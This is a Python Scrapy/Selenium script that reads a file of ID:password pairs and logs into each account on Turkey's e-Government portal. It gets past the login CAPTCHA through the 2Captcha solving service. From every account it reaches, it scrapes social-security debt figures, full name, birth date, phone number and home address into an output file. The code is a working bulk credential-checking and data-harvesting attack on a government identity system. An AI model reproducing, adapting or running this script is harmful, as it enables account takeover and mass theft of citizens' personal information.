import re
from twocaptcha import TwoCaptcha
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
import scrapy
import time,os
from selenium.webdriver.common.by import By


class TurDataSpider(scrapy.Spider):
    name = "tur_data"

    def get_driver(self):
        chrome_options = Options()
        chrome_options.add_experimental_option("detach", True)
        self.driver = webdriver.Chrome(options=chrome_options)
        self.driver.maximize_window()
        return self.driver
    def read_api_key(self):
        with open("2captcha_api.txt", "r", encoding="utf-8") as file:
            content = file.read()
            return content
    def read_input_file_txt(self):
        with open("input/login-pass.txt", "r", encoding="utf-8") as file:
            content = file.read()
            return content

    def start_requests(self):
        url = 'https://quotes.toscrape.com/'
        yield scrapy.Request(url=url, callback=self.parse)
    def parse(self, response):
        data = self.read_input_file_txt()
        new_data = data.split('\n')
        for eachrow in new_data:
            row = eachrow.strip().split(':')
            username = row[0].strip()
            password = row[1].strip()
            driver = None
            try:
                driver = self.get_driver()
                url = 'https://giris.turkiye.gov.tr/Giris/gir'
                driver.get(url)
                time.sleep(3)
                driver.find_element(By.XPATH, "//input[@type='number']").send_keys(username)
                time.sleep(1)
                driver.find_element(By.XPATH, "//input[@type='password']").send_keys(password)
                time.sleep(5)
                try:
                    captcha_img = driver.find_element(By.XPATH, '//img[@class="captchaImage"]').get_attribute('src')
                    if captcha_img:
                        driver.execute_script("window.scrollBy(0, 500);")
                        captcha_img = driver.find_element(By.CLASS_NAME, 'captchaImage')
                        captcha_img.screenshot('captchas/captcha.png')
                        time.sleep(2)
                        key = self.read_api_key()
                        captcha_key = key.strip()
                        api_key = os.getenv('APIKEY_2CAPTCHA', f'{captcha_key}')
                        solver = TwoCaptcha(api_key)
                        time.sleep(6)
                        try:
                            result = solver.normal('captchas/captcha.png')
                            code = result['code']
                            print("CAPTCHA Solved:", code)
                            time.sleep(5)
                            captcha_image_path = 'captchas/captcha.png'
                            if os.path.exists(captcha_image_path):
                                os.remove(captcha_image_path)

                            driver.find_element(By.XPATH, '//input[@id="captchaField"]').send_keys(code)
                            time.sleep(5)
                            driver.find_element(By.XPATH, "//button[@type='submit']").click()
                            time.sleep(5)
                            # url = 'https://www.turkiye.gov.tr/sgk-gss-borc-dokumu'
                            # driver.get(url)
                            # time.sleep(5)
                            new_updated_url = 'https://turkiye.gov.tr/4b-borc-durumu'
                            driver.get(new_updated_url)
                            time.sleep(7)
                            try:
                                id = driver.find_element(By.XPATH, "//h3[contains(text(),'Sicil')]").text
                                sicil = id.split(' ')[0]
                                Tescil_Durumu = driver.find_element(By.XPATH,
                                                                    "//dt[contains(text(),'Tescil Durumu')]//following-sibling::dd[1]").text
                                Toplam_Borç = driver.find_element(By.XPATH,
                                                                  "//dt[contains(text(),'Toplam Borç')]//following-sibling::dd[1]").text
                                ceza = driver.find_element(By.XPATH,
                                                           "//dt[contains(text(),'Ceza')]//following-sibling::dd[1]").text
                                prim = driver.find_element(By.XPATH,
                                                           "//dt[contains(text(),'Prim Borç Ay Sayısı')]//following-sibling::dd[1]").text

                                info_url = 'https://www.turkiye.gov.tr/kisisel-bilgiler'
                                driver.get(info_url)
                                time.sleep(5)
                                first_name = driver.find_element(By.XPATH, '//li[@class="fn"]').text
                                sur_name = driver.find_element(By.XPATH, '//li[@class="family-name"]').text
                                day_of_birth = driver.find_element(By.XPATH, '//li[@class="bday"]').text
                                phone_url = 'https://www.turkiye.gov.tr/iletisim-secenekleri-v2'
                                driver.get(phone_url)
                                time.sleep(5)
                                phone_number = driver.find_element(By.XPATH,'//dt[contains(text(),"Telefonu")]/following-sibling::dd').text
                                address_url = 'https://www.turkiye.gov.tr/adres-bilgilerim'
                                driver.get(address_url)
                                time.sleep(5)
                                address_elements = driver.find_elements(By.XPATH,"//dl[contains(@class,'adr')]//dd[position() < last() - 1]")
                                address = " ".join(
                                    [element.text.strip().replace("\u00a0", "").replace('\n', '').replace('  ', ' ')
                                     for element in address_elements]).strip()
                                address = re.sub(r'\s+', ' ', address)
                                with open("output.txt", "a", encoding='utf-8') as file:
                                    data = f'Sicil: {sicil} | Tescil Durumu: {Tescil_Durumu} | Toplam Borç: {Toplam_Borç} | Ceza: {ceza} | Prim Borç Ay Sayısı: {prim} | id: {username} | Name: {first_name} | Surname: {sur_name} | Birth date: {day_of_birth} | Phone: {phone_number} | Address: {address}\n'
                                    file.write(data)
                            except Exception as e:
                                pass

                        except Exception as e:
                            with open("failed_output.txt", "a", encoding='utf-8') as file:
                                data = f'id: {username} \n'
                                file.write(data)
                    else:
                        pass


                except Exception as e:
                    driver.find_element(By.XPATH, "//button[@type='submit']").click()
                    time.sleep(5)
                    try:
                        captcha_img = driver.find_element(By.XPATH, '//img[@class="captchaImage"]').get_attribute('src')
                        if captcha_img:
                            driver.find_element(By.XPATH, "//input[@type='password']").send_keys(password)
                            time.sleep(3)
                            driver.execute_script("window.scrollBy(0, 500);")
                            captcha_img = driver.find_element(By.CLASS_NAME, 'captchaImage')
                            captcha_img.screenshot('captchas/captcha.png')
                            time.sleep(2)
                            key = self.read_api_key()
                            captcha_key = key.strip()
                            api_key = os.getenv('APIKEY_2CAPTCHA', f'{captcha_key}')
                            solver = TwoCaptcha(api_key)
                            time.sleep(6)
                            try:
                                result = solver.normal('captchas/captcha.png')
                                code = result['code']
                                print("CAPTCHA Solved:", code)
                                time.sleep(5)
                                captcha_image_path = 'captchas/captcha.png'
                                if os.path.exists(captcha_image_path):
                                    os.remove(captcha_image_path)
                                driver.find_element(By.XPATH, '//input[@id="captchaField"]').send_keys(code)
                                time.sleep(5)
                                driver.find_element(By.XPATH, "//button[@type='submit']").click()
                                time.sleep(5)
                                # url = 'https://www.turkiye.gov.tr/sgk-gss-borc-dokumu'
                                # driver.get(url)
                                # time.sleep(5)
                                new_updated_url = 'https://turkiye.gov.tr/4b-borc-durumu'
                                driver.get(new_updated_url)
                                time.sleep(7)
                                try:

                                    id = driver.find_element(By.XPATH, "//h3[contains(text(),'Sicil')]").text
                                    sicil = id.split(' ')[0]
                                    Tescil_Durumu = driver.find_element(By.XPATH,
                                                                        "//dt[contains(text(),'Tescil Durumu')]//following-sibling::dd[1]").text
                                    Toplam_Borç = driver.find_element(By.XPATH,
                                                                      "//dt[contains(text(),'Toplam Borç')]//following-sibling::dd[1]").text
                                    ceza = driver.find_element(By.XPATH,
                                                               "//dt[contains(text(),'Ceza')]//following-sibling::dd[1]").text
                                    prim = driver.find_element(By.XPATH,
                                                               "//dt[contains(text(),'Prim Borç Ay Sayısı')]//following-sibling::dd[1]").text

                                    info_url='https://www.turkiye.gov.tr/kisisel-bilgiler'
                                    driver.get(info_url)
                                    time.sleep(5)
                                    first_name=driver.find_element(By.XPATH,'//li[@class="fn"]').text
                                    sur_name=driver.find_element(By.XPATH,'//li[@class="family-name"]').text
                                    day_of_birth = driver.find_element(By.XPATH,'//li[@class="bday"]').text
                                    phone_url='https://www.turkiye.gov.tr/iletisim-secenekleri-v2'
                                    driver.get(phone_url)
                                    time.sleep(5)
                                    phone_number= driver.find_element(By.XPATH,'//dt[contains(text(),"Telefonu")]/following-sibling::dd').text
                                    address_url='https://www.turkiye.gov.tr/adres-bilgilerim'
                                    driver.get(address_url)
                                    time.sleep(5)
                                    address_elements = driver.find_elements(By.XPATH,"//dl[contains(@class,'adr')]//dd[position() < last() - 1]")
                                    address = " ".join(
                                        [element.text.strip().replace("\u00a0", "").replace('\n', '').replace('  ',
                                                                                                              ' ')
                                         for element in address_elements]).strip()
                                    address = re.sub(r'\s+', ' ', address)
                                    with open("output.txt", "a", encoding='utf-8') as file:
                                        data = f'Sicil: {sicil} | Tescil Durumu: {Tescil_Durumu} | Toplam Borç: {Toplam_Borç} | Ceza: {ceza} | Prim Borç Ay Sayısı: {prim} | id: {username} | Name: {first_name} | Surname: {sur_name} | Birth date: {day_of_birth} | Phone: {phone_number} | Address: {address}\n'
                                        file.write(data)

                                except Exception as inner_e:
                                    pass
                            except Exception as inner_e:
                                with open("failed_output.txt", "a", encoding='utf-8') as file:
                                    data = f'id: {username} \n'
                                    file.write(data)
                    except Exception as e:

                        # url = 'https://www.turkiye.gov.tr/sgk-gss-borc-dokumu'
                        # driver.get(url)
                        # time.sleep(8)
                        new_updated_url= 'https://turkiye.gov.tr/4b-borc-durumu'
                        driver.get(new_updated_url)
                        time.sleep(6)
                        try:
                            id = driver.find_element(By.XPATH, "//h3[contains(text(),'Sicil')]").text
                            sicil = id.split(' ')[0]
                            Tescil_Durumu = driver.find_element(By.XPATH,
                                                                "//dt[contains(text(),'Tescil Durumu')]//following-sibling::dd[1]").text
                            Toplam_Borç = driver.find_element(By.XPATH,
                                                              "//dt[contains(text(),'Toplam Borç')]//following-sibling::dd[1]").text
                            ceza = driver.find_element(By.XPATH,
                                                       "//dt[contains(text(),'Ceza')]//following-sibling::dd[1]").text
                            prim = driver.find_element(By.XPATH,
                                                       "//dt[contains(text(),'Prim Borç Ay Sayısı')]//following-sibling::dd[1]").text

                            info_url = 'https://www.turkiye.gov.tr/kisisel-bilgiler'
                            driver.get(info_url)
                            time.sleep(5)
                            first_name = driver.find_element(By.XPATH, '//li[@class="fn"]').text
                            sur_name = driver.find_element(By.XPATH, '//li[@class="family-name"]').text
                            day_of_birth = driver.find_element(By.XPATH, '//li[@class="bday"]').text
                            phone_url = 'https://www.turkiye.gov.tr/iletisim-secenekleri-v2'
                            driver.get(phone_url)
                            time.sleep(5)
                            phone_number = driver.find_element(By.XPATH,'//dt[contains(text(),"Telefonu")]/following-sibling::dd').text
                            address_url = 'https://www.turkiye.gov.tr/adres-bilgilerim'
                            driver.get(address_url)
                            time.sleep(5)
                            address_elements = driver.find_elements(By.XPATH,"//dl[contains(@class,'adr')]//dd[position() < last() - 1]")
                            address = " ".join(
                                [element.text.strip().replace("\u00a0", "").replace('\n', '').replace('  ', ' ')
                                 for element in address_elements]).strip()
                            address = re.sub(r'\s+', ' ', address)

                            with open("output.txt", "a", encoding='utf-8') as file:
                                data = f'Sicil: {sicil} | Tescil Durumu: {Tescil_Durumu} | Toplam Borç: {Toplam_Borç} | Ceza: {ceza} | Prim Borç Ay Sayısı: {prim} | id: {username} | Name: {first_name} | Surname: {sur_name} | Birth date: {day_of_birth} | Phone: {phone_number} | Address: {address}\n'
                                file.write(data)

                        except Exception as e:
                            with open("failed_output.txt", "a", encoding='utf-8') as file:
                                data = f'id: {username} \n'
                                file.write(data)


            except Exception as e:
                pass


            finally:
                if driver:
                    driver.quit()

